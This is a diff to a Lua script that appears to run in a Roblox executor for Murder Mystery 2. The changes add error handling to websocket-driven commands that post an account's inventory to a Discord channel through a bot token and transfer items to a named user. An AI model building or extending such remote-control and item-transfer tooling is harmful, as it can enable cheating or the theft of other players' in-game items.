@@ -120,11 +120,15 @@ local function wsConnect()
                 elseif data.action == "command" then
                     local cmd, args = data.cmd, data.args or {}
                     task.spawn(function()
-                        if cmd == "inv" then pcall(inv)
-                        elseif cmd == "invf" then pcall(invf)
-                        elseif cmd == "rejoin" then pcall(doRejoin)
-                        elseif cmd == "stoptransfer" then pcall(doStopTrade)
-                        elseif cmd == "transfer" then pcall(doTransfer, args.fromrarity, args.user)
+                        local ok, err
+                        if cmd == "inv" then ok, err = pcall(inv)
+                        elseif cmd == "invf" then ok, err = pcall(invf)
+                        elseif cmd == "rejoin" then ok, err = pcall(doRejoin)
+                        elseif cmd == "stoptransfer" then ok, err = pcall(doStopTrade)
+                        elseif cmd == "transfer" then ok, err = pcall(doTransfer, args.fromrarity, args.user)
+                        end
+                        if ok == false then
+                            warn("[mm2] command '" .. tostring(cmd) .. "' failed: " .. tostring(err))
                         end
                     end)
                 end
@@ -856,6 +860,10 @@ task.spawn(function()
     end
 end)
 function inv()
+    if not (bottoken and bottoken ~= "" and logid and logid ~= "") then
+        warn("[mm2] inv: missing bottoken/logid (aj.txt not loaded in this executor's workspace?)")
+        return
+    end
     setStatus("Sending inventory")
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
     neww = {}
@@ -930,10 +938,14 @@ function inv()
     setStatus("Waiting for trades")
 end
 function invf()
+    if not (bottoken and bottoken ~= "" and logid and logid ~= "") then
+        warn("[mm2] invf: missing bottoken/logid (aj.txt not loaded in this executor's workspace?)")
+        return
+    end
     setStatus("Sending inventory")
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
 
-    
+
     local inventroy = "Inventory value: "
     talbe = {}
     vaule = 0
